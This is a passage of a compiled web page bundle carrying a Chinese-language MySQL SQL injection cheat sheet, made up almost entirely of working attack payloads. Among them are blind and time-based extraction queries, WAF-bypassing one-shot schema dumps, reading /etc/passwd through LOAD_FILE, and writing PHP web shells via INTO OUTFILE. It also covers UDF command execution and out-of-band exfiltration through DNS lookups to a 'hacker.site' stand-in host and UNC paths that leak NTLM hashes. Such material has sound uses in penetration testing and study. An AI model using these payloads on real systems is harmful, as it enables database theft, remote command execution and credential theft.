x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u76f2",children:"MYSQL \u76f2"}),"\n",(0,l.jsx)(n.h3,{id:"\u5177\u6709\u7b49\u6548\u5b50\u5b57\u7b26\u4e32\u7684-mysql-\u76f2",children:"\u5177\u6709\u7b49\u6548\u5b50\u5b57\u7b26\u4e32\u7684 MYSQL \u76f2"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"?id=1 and substring(version(),1,1)=5\n?id=1 and right(left(version(),1),1)=5\n?id=1 and left(version(),1)=4\n?id=1 and ascii(lower(substr(Version(),1,1)))=51\n?id=1 and (select mid(version(),1,1)=4)\n?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528\u4e8c\u8fdb\u5236\u67e5\u8be2\u548c-regexp-\u5728-order-by-\u5b50\u53e5\u4e2d\u8fdb\u884c-mysql-\u76f2-sql-\u6ce8\u5165",children:"\u4f7f\u7528\u4e8c\u8fdb\u5236\u67e5\u8be2\u548c REGEXP \u5728 ORDER BY \u5b50\u53e5\u4e2d\u8fdb\u884c MySQL \u76f2 SQL \u6ce8\u5165"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u4e2a\u67e5\u8be2\u57fa\u672c\u4e0a\u6309\u4e00\u5217\u6216\u53e6\u4e00\u5217\u6392\u5e8f\uff0c\u8fd9\u53d6\u51b3\u4e8e EXISTS\uff08\uff09\u662f\u5426\u8fd4\u56de 1. \u4e3a\u4e86\u8ba9 EXISTS\uff08\uff09\u51fd\u6570\u8fd4\u56de 1\uff0cREGEXP \u67e5\u8be2\u9700\u8981\u5339\u914d\uff0c\u8fd9\u610f\u5473\u7740\u60a8\u53ef\u4ee5\u9010\u4e2a\u5b57\u7b26\u5730\u4f2a\u9020\u76f2\u503c\uff0c\u5e76\u5728\u6ca1\u6709\u76f4\u63a5\u8f93\u51fa\u7684\u60c5\u51b5\u4e0b\u4ece\u6570\u636e\u5e93\u6cc4\u6f0f\u6570\u636e\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:'[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -\n'})}),"\n",(0,l.jsx)(n.h3,{id:"mysql-\u76f2-sql-\u6ce8\u5165\u4e8c\u8fdb\u5236\u67e5\u8be2\u4f7f\u7528-regexp",children:"MySQL \u76f2 SQL \u6ce8\u5165\u4e8c\u8fdb\u5236\u67e5\u8be2\u4f7f\u7528 REGEXP\u3002"}),"\n",(0,l.jsx)(n.p,{children:"\u6709\u6548\u8f7d\u8377\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:'\' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u5c06\u5728\u67e5\u8be2\u4e2d\u5de5\u4f5c\uff08\u5176\u4e2d\u201cwhere\u201d\u5b50\u53e5\u662f\u6ce8\u5165\u70b9\uff09\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -';\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u5728\u4e0a\u8ff0\u67e5\u8be2\u4e2d\uff0c\u5b83\u5c06\u68c0\u67e5\u201c\u9879\u76ee\u201d\u6570\u636e\u5e93\u4e2d\u4ee5\u201ca\u201d\u5f00\u5934\u7684\u201c\u540d\u79f0\u201d\u5217\u4e2d\u662f\u5426\u5b58\u5728\u9879\u76ee\u3002\u5982\u679c\u5b83\u80fd\u4e3a\u6bcf\u4e2a\u9879\u76ee\u7761\u7720 3 \u79d2\u3002"}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5\u7684-mysql-\u76f2",children:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5\u7684 MYSQL \u76f2"}),"\n",(0,l.jsxs)(n.p,{children:["\u771f\uff1a ",(0,l.jsx)(n.code,{children:"if @@version starts with a 5"}),"\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\nResponse:\nHTTP/1.1 500 Internal Server Error\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u9519\u8bef\uff1a ",(0,l.jsx)(n.code,{children:"if @@version starts with a 4"}),"\uff1a"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2\nResponse:\nHTTP/1.1 200 OK\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u5e26-make_set-\u7684-mysql-\u76f2",children:"\u5e26 MAKE_SET \u7684 MYSQL \u76f2"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"AND MAKE_SET(YOLO<(SELECT(length(version()))),1)\nAND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)\nAND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)\nAND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u5e26-like-\u7684-mysql-\u76f2",children:"\u5e26 LIKE \u7684 MYSQL \u76f2"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.a,{href:"https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php",children:"'_'"}),"\u7684\u4f5c\u7528\u7c7b\u4f3c\u6b63\u5219\u8868\u8fbe\u5f0f\u5b57\u7b26\u201c.\u201d\uff0c\u7528\u5b83\u6765\u52a0\u901f\u60a8\u7684\u76f2\u6d4b"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u57fa\u4e8e\u65f6\u95f4",children:"MYSQL \u57fa\u4e8e\u65f6\u95f4"}),"\n",(0,l.jsx)(n.p,{children:"\u4ee5\u4e0b SQL \u4ee3\u7801\u5c06\u5ef6\u8fdf MySQL \u7684\u8f93\u51fa\u3002"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["MySQL 4/5: ",(0,l.jsx)(n.code,{children:"BENCHMARK()"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"+BENCHMARK(40000000,SHA1(1337))+\n'%2Bbenchmark(3200,SHA1(1))%2B'\nAND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1\n"})}),"\n"]}),"\n",(0,l.jsxs)(n.li,{children:["MySQL 5: ",(0,l.jsx)(n.code,{children:"SLEEP()"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"RLIKE SLEEP([SLEEPTIME])\nOR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))\n"})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"\u5728\u5b50\u9009\u62e9\u4e2d\u4f7f\u7528-sleep",children:"\u5728\u5b50\u9009\u62e9\u4e2d\u4f7f\u7528 SLEEP"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"1 and (select sleep(10) from dual where database() like '%')#\n1 and (select sleep(10) from dual where database() like '___')# \n1 and (select sleep(10) from dual where database() like '____')#\n1 and (select sleep(10) from dual where database() like '_____')#\n1 and (select sleep(10) from dual where database() like 'a____')#\n...\n1 and (select sleep(10) from dual where database() like 's____')#\n1 and (select sleep(10) from dual where database() like 'sa___')#\n...\n1 and (select sleep(10) from dual where database() like 'sw___')#\n1 and (select sleep(10) from dual where database() like 'swa__')#\n1 and (select sleep(10) from dual where database() like 'swb__')#\n1 and (select sleep(10) from dual where database() like 'swi__')#\n...\n1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5",children:"\u4f7f\u7528\u6761\u4ef6\u8bed\u53e5"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --\n?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-dios-\u4e00\u6b21\u6027\u8f6c\u50a8",children:"MYSQL DIOS-\u4e00\u6b21\u6027\u8f6c\u50a8"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#\n\n(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#\n\n-- SecurityIdiots\nmake_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n\n-- Profexer\n(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)\n\n-- Dr.Z3r0\n(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))\n\n-- M@dBl00d\n(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))\n\n-- Zen\n+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n\n-- Zen WAF\n(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)\n\n-- ~tr0jAn WAF\n+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+\n\n-- ~tr0jAn Benchmark\n+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+\n\n-- N1Z4M WAF\n+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+\n\n-- sharik\n(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u5f53\u524d\u67e5\u8be2",children:"MYSQL \u5f53\u524d\u67e5\u8be2"}),"\n",(0,l.jsx)(n.p,{children:"\u8be5\u8868\u53ef\u4ee5\u5217\u51fa DB \u76ee\u524d\u6b63\u5728\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #\n\n-- Dump in one shot example for the table content.\nunion select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9",children:"MYSQL \u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9"}),"\n",(0,l.jsxs)(n.p,{children:["\u9700\u8981 ",(0,l.jsx)(n.code,{children:"filepriv"}),"\uff0c\u5426\u5219\u60a8\u5c06\u5f97\u5230\u9519\u8bef\uff1a ",(0,l.jsx)(n.code,{children:"ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"' UNION ALL SELECT LOAD_FILE('/etc/passwd') --\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u5982\u679c\u60a8\u5728\u6570\u636e\u5e93\u4e0a\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u67e5\u8be2\u91cd\u65b0\u542f\u7528 ",(0,l.jsx)(n.code,{children:"LOAD_FILE"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u7f16\u5199\u4e00\u4e2a-shell",children:"MYSQL \u7f16\u5199\u4e00\u4e2a shell"}),"\n",(0,l.jsx)(n.h3,{id:"\u8fdb\u5165\u5916\u573a\u6cd5",children:"\u8fdb\u5165\u5916\u573a\u6cd5"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'\n[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\u5199\u5165\u6587\u4ef6\u65b9\u6cd5",children:"\u5199\u5165\u6587\u4ef6\u65b9\u6cd5"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u622a\u65ad",children:"MYSQL \u622a\u65ad"}),"\n",(0,l.jsxs)(n.p,{children:["\u5728 MYSQL \u4e2d\uff0c\u201c ",(0,l.jsx)(n.code,{children:"admin "}),"\u201d\u548c\u201c ",(0,l.jsx)(n.code,{children:"admin"}),"\u201d\u662f\u76f8\u540c\u7684\u3002\u5982\u679c\u6570\u636e\u5e93\u4e2d\u7684 username \u5217\u6709\u5b57\u7b26\u9650\u5236\uff0c\u5219\u4f1a\u622a\u65ad\u5176\u4f59\u5b57\u7b26\u3002\u56e0\u6b64\uff0c\u5982\u679c\u6570\u636e\u5e93\u7684\u5217\u9650\u5236\u4e3a 20 \u4e2a\u5b57\u7b26\uff0c\u5e76\u4e14\u6211\u4eec\u8f93\u5165\u4e86\u4e00\u4e2a\u5305\u542b 21 \u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\uff0c\u5219\u6700\u540e 1 \u4e2a\u5b57\u7b26\u5c06\u88ab\u5220\u9664\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"`username` varchar(20) not null\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u6709\u6548\u8f7d\u8377\uff1a ",(0,l.jsx)(n.code,{children:'username = "admin               a"'})]}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u5feb\u901f\u5229\u7528",children:"MYSQL \u5feb\u901f\u5229\u7528"}),"\n",(0,l.jsxs)(n.p,{children:["\u8981\u6c42\uff1a ",(0,l.jsx)(n.code,{children:"MySQL >= 5.7.22"})]}),"\n",(0,l.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,l.jsx)(n.code,{children:"json_arrayagg()"})," \u800c\u4e0d\u662f\uff0c\u8fd9\u6837\u53ef\u4ee5\u663e\u793a\u66f4\u5c11\u7684\u7b26\u53f7"]}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"group_concat\uff08\uff09=1024 \u4e2a\u7b26\u53f7"}),"\n",(0,l.jsx)(n.li,{children:"json_arrayagg\uff08\uff09>16000000 \u4e2a\u7b26\u53f7"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-udf-\u547d\u4ee4\u6267\u884c",children:"MYSQL UDF \u547d\u4ee4\u6267\u884c"}),"\n",(0,l.jsx)(n.p,{children:"\u9996\u5148\uff0c\u60a8\u9700\u8981\u68c0\u67e5 UDF \u662f\u5426\u5b89\u88c5\u5728\u670d\u52a1\u5668\u4e0a\u3002"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"$ whereis lib_mysqludf_sys.so\n/usr/lib/lib_mysqludf_sys.so\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u7136\u540e\u60a8\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982 ",(0,l.jsx)(n.code,{children:"sys_exec"})," \u548c ",(0,l.jsx)(n.code,{children:"sys_eval"})," \u4e4b\u7c7b\u7684\u529f\u80fd\u3002"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"$ mysql -u root -p mysql\nEnter password: [...]\nmysql> SELECT sys_eval('id');\n+--------------------------------------------------+\n| sys_eval('id') |\n+--------------------------------------------------+\n| uid=118(mysql) gid=128(mysql) groups=128(mysql) |\n+--------------------------------------------------+\n"})}),"\n",(0,l.jsx)(n.h2,{id:"mysql-\u5e26\u5916",children:"MYSQL \u5e26\u5916"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"select @@version into outfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';\nselect @@version into dumpfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt\n"})}),"\n",(0,l.jsx)(n.h3,{id:"dns-\u5916\u8fc7\u6ee4",children:"DNS \u5916\u8fc7\u6ee4"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"select load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt'));\nselect load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))\n"})}),"\n",(0,l.jsx)(n.h3,{id:"unc-\u8def\u5f84-ntlm-\u54c8\u5e0c\u7a83\u53d6",children:"UNC \u8def\u5f84-NTLM \u54c8\u5e0c\u7a83\u53d6"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sql",children:"select load_file('\\\\\\\\error\\\\abc');\nselect load_file(0x5c5c5c5c6572726f725c5c616263);\nselect 'osanda' into dumpfile '\\\\\\\\error\\\\abc';\nselect 'osanda' into outfile '\\\\\\\\error\\\\abc';\nload data infile '\\\\\\\\error\\\\abc' into table database.table_name;\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\u53c2\u8003\u6587\u732e",children:"\u53c2\u8003\u6587\u732e"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf",children:"MySQL \u5e26\u5916\u9ed1\u5ba2\u653b\u51fb-@OsandaMalith"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/",children:"[Sqli] \u5728\u4e0d\u77e5\u9053\u5217\u540d\u7684\u60c5\u51b5\u4e0b\u63d0\u53d6\u6570\u636e-Ahmed Sultan@0x4148"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://rdot.org/forum/showpost.php?p=114&postcount=1",children:"MySQL \u6ce8\u5c04\u5668\u5e2e\u52a9-rdot.org"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://resources.infosecinstitute.com/sql-truncation-attack/",children:"SQL \u622a\u65ad\u653b\u51fb-Warlock"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://hackerone.com/reports/508123",children:"\u9ed1\u5ba2\u4e00\u53f7 @ajxchapman 50 \u7c73 ctf \u5199\u4f5c-Alex Chapman@ajxchabman"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://sqlwiki.netspi.com/injectionTypes/errorBased",children:"SQL Wiki-netspi"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100",children:"kokoparty \u7f51\u7edc 100"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://websec.ca/kb/sql_injection#MySQL_Default_Databases",children:"WebSec-MySQL-Roberto Salgado-2013 \u5e74 5 \u6708 29 \u65e5\u3002"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(o,{...e})}):o(e)}},8453:(e,n,c)=>{c.d(n,{R:()=>r,x:()=>d});var s=c(6540);const l={},a=s.createContext(l);function r(e){const n=s.useContext(a);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:r(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);